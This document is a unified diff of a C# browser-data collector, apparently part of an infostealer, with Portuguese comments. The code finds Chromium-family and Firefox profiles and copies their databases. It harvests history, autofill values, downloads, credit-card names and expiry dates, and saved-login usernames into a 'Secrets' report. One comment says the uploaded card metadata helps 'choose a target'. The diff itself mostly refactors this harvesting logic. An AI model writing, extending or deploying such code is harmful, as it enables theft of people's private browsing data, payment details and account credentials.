@@ -1,4 +1,5 @@
 using System.Text;
+using System.Text.Json;
 using Microsoft.Data.Sqlite;
 using Teste.Core;
 using Teste.Native;
@@ -16,15 +17,16 @@ public static class BrowserCollector
 
     // Rodada inteira nao passa de 3 s por navegador, mesmo em perfil com 200k urls.
     private const int MaxRows = 5000;
+    private const long MaxJson = 8L * 1024 * 1024;
 
     private static readonly (string Name, string Rel)[] Roots =
     {
-        ("chrome",  @"Google\Chrome\User Data"),
-        ("edge",    @"Microsoft\Edge\User Data"),
-        ("brave",   @"BraveSoftware\Brave-Browser\User Data"),
-        ("vivaldi", @"Vivaldi\User Data"),
-        ("opera",   @"Opera Software\Opera Stable"),
-        ("chromium",@"Chromium\User Data"),
+        ("chrome",   @"Google\Chrome\User Data"),
+        ("edge",     @"Microsoft\Edge\User Data"),
+        ("brave",    @"BraveSoftware\Brave-Browser\User Data"),
+        ("vivaldi",  @"Vivaldi\User Data"),
+        ("opera",    @"Opera Software\Opera Stable"),
+        ("chromium", @"Chromium\User Data"),
     };
 
     public static void Collect(Report r, Logger log)
@@ -39,15 +41,16 @@ public static class BrowserCollector
 
             foreach (var profile in Profiles(root))
             {
-                n += FromHistory(r, brand, profile, log);
-                n += FromCards(r, brand, profile, log);
-                n += FromDownloads(r, brand, profile, log);
+                var tag = $"{brand}/{Path.GetFileName(profile)}";
+                n += FromHistory(r, tag, log);
+                n += FromCards(r, tag, log);
+                n += FromDownloads(r, tag, log);
             }
         }
 
         n += FromFirefox(r, log);
 
-        log.Line($"historico: {n} linhas de navegador, {r.Secrets.Count} segredos no total");
+        log.Line($"navegador: {n} linhas coletadas");
     }
 
     private static IEnumerable<string> Profiles(string root)
@@ -66,29 +69,32 @@ public static class BrowserCollector
 
     // ------------------------------------------------------------------ history
 
-    private static int FromHistory(Report r, string brand, string profile, Logger log)
+    private static int FromHistory(Report r, string tag, Logger log)
     {
-        var src = Path.Combine(profile, "History");
+        var dir = tag[..tag.IndexOf('/')];
+        var profile = tag[(tag.IndexOf('/') + 1)..];
+        var src = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            RootOf(dir)!, profile, "History");
         if (!File.Exists(src)) return 0;
 
         var count = 0;
-        Try(r, brand, "historico", log, src, db =>
+        Try(r, dir, "historico", log, src, db =>
         {
-            // visit_time esta em microssegundos desde 1601; o offset converte para Unix.
             foreach (var row in Query(db, @"
-                SELECT u.url, u.title, u.visit_count, v.visit_time, v.visit_duration
+                SELECT u.url, u.title, u.visit_count, v.visit_time
                 FROM visits v JOIN urls u ON u.id = v.url
                 ORDER BY v.visit_time DESC LIMIT $lim", MaxRows))
             {
                 r.Secrets.Add(new SecretRec
                 {
-                    Source = $"{brand}/{Path.GetFileName(profile)}",
+                    Source = tag,
                     Kind = "historico",
-                    Key = WebTime(row["visit_time"]).ToString("yyyy-MM-dd HH:mm:ss"),
-                    Value = Trunc(Str(row, "url"), 500),
+                    Key = Trunc(Str(row, "url"), 500),
+                    Value = WebTime(row, "visit_time"),
                     User = $"{Str(row, "visit_count")} visitas",
                     Status = "ok",
-                    Note = Trunc(Str(row, "title"), 160)
+                    Extra = Trunc(Str(row, "title"), 160)
                 });
                 count++;
             }
@@ -98,49 +104,44 @@ public static class BrowserCollector
 
     // -------------------------------------------------------------------- cards
 
-    private static int FromCards(Report r, string brand, string profile, Logger log)
+    private static int FromCards(Report r, string tag, Logger log)
     {
-        var src = Path.Combine(profile, "Web Data");
+        var dir = tag[..tag.IndexOf('/')];
+        var profile = tag[(tag.IndexOf('/') + 1)..];
+        var src = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            RootOf(dir)!, profile, "Web Data");
         if (!File.Exists(src)) return 0;
 
         var count = 0;
 
-        Try(r, brand, "cartao", log, src, db =>
+        Try(r, dir, "cartao", log, src, db =>
         {
             foreach (var row in Query(db, @"
-                SELECT name_on_card, expiration_month, expiration_year,
-                       card_number_encrypted, date_last_used
-                FROM credit_cards", MaxRows))
+            SELECT name_on_card, expiration_month, expiration_year,
+            card_number_encrypted, origin
+            FROM credit_cards LIMIT $lim", MaxRows))
             {
-                var enc = Str(row, "card_number_encrypted");
+                var enc = Bytes(row, "card_number_encrypted");
                 r.Secrets.Add(new SecretRec
                 {
-                    Source = $"{brand}/{Path.GetFileName(profile)}",
+                    Source = tag,
                     Kind = "cartao",
                     Key = Str(row, "name_on_card"),
                     // O numero em si esta cifrado com a chave do Chrome; o que sobe aqui
                     // e o metadado, que ja serve para escolher alvo.
-                    Value = enc.Length > 0 ? $"{enc.Length} bytes cifrados (AES-GCM)" : "(vazio)",
+                    Value = enc > 0 ? $"{enc} bytes cifrados (AES-GCM)" : "(vazio)",
                     User = $"{Str(row, "expiration_month")}/{Str(row, "expiration_year")}",
-                    Status = enc.Length > 0 ? "app_bound" : "ok",
-                    Note = WebTime(row["date_last_used"]).ToString("yyyy-MM-dd")
+                    Status = enc > 0 ? "app_bound" : "ok",
+                    Extra = Trunc(Str(row, "origin"), 120)
                 });
                 count++;
             }
         });
 
-        Try(r, brand, "autofill", log, src, db =>
+        Try(r, dir, "autofill", log, src, db =>
         {
             // autofill nao tem nome de coluna previsivel: o nome do campo E o conteudo.
-            // Duas consultas, uma para saber quais campos existem, outra para ler.
-            var fields = new List<string>();
-            foreach (var row in Query(db, "SELECT DISTINCT name FROM autofill", 400))
-            {
-                var f = Str(row, "name");
-                if (f.Length > 0) fields.Add(f);
-            }
-            if (fields.Count == 0) return;
-
             foreach (var row in Query(db, @"
                 SELECT name, value FROM autofill
                 ORDER BY name LIMIT $lim", MaxRows))
@@ -150,7 +151,7 @@ public static class BrowserCollector
 
                 r.Secrets.Add(new SecretRec
                 {
-                    Source = $"{brand}/{Path.GetFileName(profile)}",
+                    Source = tag,
                     Kind = "autofill",
                     Key = Str(row, "name"),
                     Value = Trunc(value, 300),
@@ -165,13 +166,17 @@ public static class BrowserCollector
 
     // ---------------------------------------------------------------- downloads
 
-    private static int FromDownloads(Report r, string brand, string profile, Logger log)
+    private static int FromDownloads(Report r, string tag, Logger log)
     {
-        var src = Path.Combine(profile, "History");
+        var dir = tag[..tag.IndexOf('/')];
+        var profile = tag[(tag.IndexOf('/') + 1)..];
+        var src = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            RootOf(dir)!, profile, "History");
         if (!File.Exists(src)) return 0;
 
         var count = 0;
-        Try(r, brand, "download", log, src, db =>
+        Try(r, dir, "download", log, src, db =>
         {
             foreach (var row in Query(db, @"
                 SELECT target_path, referrer, start_time
@@ -179,12 +184,12 @@ public static class BrowserCollector
             {
                 r.Secrets.Add(new SecretRec
                 {
-                    Source = $"{brand}/{Path.GetFileName(profile)}",
+                    Source = tag,
                     Kind = "download",
                     Key = Trunc(Str(row, "target_path"), 300),
                     Value = Trunc(Str(row, "referrer"), 300),
                     Status = "ok",
-                    Note = WebTime(row["start_time"]).ToString("yyyy-MM-dd HH:mm")
+                    Extra = WebTime(row, "start_time")
                 });
                 count++;
             }
@@ -212,13 +217,15 @@ public static class BrowserCollector
 
             try
             {
-                var json = Files.ReadAllText(logins, 4 * 1024 * 1024);
+                if (new FileInfo(logins).Length > MaxJson) continue;
+
+                var json = Files.ReadAllText(logins);
                 if (json.Length == 0) continue;
 
-                using var doc = System.Text.Json.JsonDocument.Parse(json);
-                if (!doc.RootElement.TryGetProperty("logins", out var loginsArr)) continue;
+                using var doc = JsonDocument.Parse(json);
+                if (!doc.RootElement.TryGetProperty("logins", out var arr)) continue;
 
-                foreach (var l in loginsArr.EnumerateArray())
+                foreach (var l in arr.EnumerateArray())
                 {
                     r.Secrets.Add(new SecretRec
                     {
@@ -228,8 +235,7 @@ public static class BrowserCollector
                         Value = "(cifrado por key4.db)",
                         User = Str(l, "username"),
                         Status = "app_bound",
-                        Note = $"uso: {(l.TryGetProperty("timesUsed", out var t) ? t.ToString() : "?")}"
-
+                        Extra = l.TryGetProperty("timesUsed", out var t) ? $"uso: {t}" : ""
                     });
                     count++;
                 }
@@ -244,26 +250,23 @@ public static class BrowserCollector
 
     // ------------------------------------------------------------------ helpers
 
+    private static string? RootOf(string brand) =>
+        Roots.FirstOrDefault(x => x.Name == brand).Rel;
+
     // O banco esta aberto pelo navegador: copia antes de ler, senao o SQLite trava.
-    private static void Try(Report r, string brand, string stage, Logger log,
-                            string src, Action<string> body)
-    {
-        var tmp = Path.Combine(Path.GetTempPath(),
-            $"t{Guid.NewGuid():N}.db");
-        try
-        {
-            Files.Copy(src, tmp);
-            body(tmp);
-        }
-        catch (Exception ex)
-        {
-            r.Errors.Add(new ErrorRec(stage, $"{brand}: {ex.GetType().Name}: {ex.Message}"));
-            log.Line($"  ! {brand} {stage}: {ex.Message}");
-        }
-        finally
-        {
-            try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
-        }
+    private static void Try(Report r, string brand, string stage, Logger log,                            
+    string src, Action<string> body)    
+    {        
+    try        
+    {            
+        using var snap = new DbSnapshot(src);            
+        body(snap.Conn.DataSource);        
+        }        
+        catch (Exception ex)        
+        {            
+            r.Errors.Add(new ErrorRec(stage, $"{brand}: {ex.GetType().Name}: {ex.Message}"));            
+            log.Line($"  ! {brand} {stage}: {ex.Message}");        
+        }    
     }
 
     private static IEnumerable<Dictionary<string, object?>> Query(
@@ -273,7 +276,7 @@ public static class BrowserCollector
         cn.Open();
         using var cmd = cn.CreateCommand();
         cmd.CommandText = sql;
-        cmd.Parameters.AddWithValue("$lim", limit);
+        if (sql.Contains("$lim")) cmd.Parameters.AddWithValue("$lim", limit);
         using var rd = cmd.ExecuteReader();
 
         var names = new string[rd.FieldCount];
@@ -282,19 +285,26 @@ public static class BrowserCollector
         while (rd.Read())
         {
             var row = new Dictionary<string, object?>(rd.FieldCount);
-            for (var i = 0; i < rd.FieldCount; i++) row[names[i]] = rd.IsDBNull(i) ? null : rd.GetValue(i);
+            for (var i = 0; i < rd.FieldCount; i++)
+                row[names[i]] = rd.IsDBNull(i) ? null : rd.GetValue(i);
             yield return row;
         }
     }
 
-    private static DateTime WebTime(object? v) =>
-        v is long ticks && ticks > 0 ? Epoch1601.AddTicks(ticks * 10).ToLocalTime() : DateTime.MinValue;
+    // WebKit: microssegundos desde 1601-01-01.
+    private static string WebTime(Dictionary<string, object?> row, string key) =>
+        row[key] is long ticks and > 0
+            ? Epoch1601.AddTicks(ticks * 10).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
+            : "";
+
+    private static long Bytes(Dictionary<string, object?> row, string key) =>
+        row.TryGetValue(key, out var v) && v is byte[] b ? b.Length : 0;
 
     private static string Str(Dictionary<string, object?> row, string key) =>
         row.TryGetValue(key, out var v) && v is not null ? v.ToString() ?? "" : "";
 
-    private static string Str(System.Text.Json.JsonElement el, string key) =>
-        el.TryGetProperty(key, out var v) && v.ValueKind == System.Text.Json.JsonValueKind.String
+    private static string Str(JsonElement el, string key) =>
+        el.TryGetProperty(key, out var v) && v.ValueKind == JsonValueKind.String
             ? v.GetString() ?? "" : "";
 
     private static string Trunc(string s, int n) =>
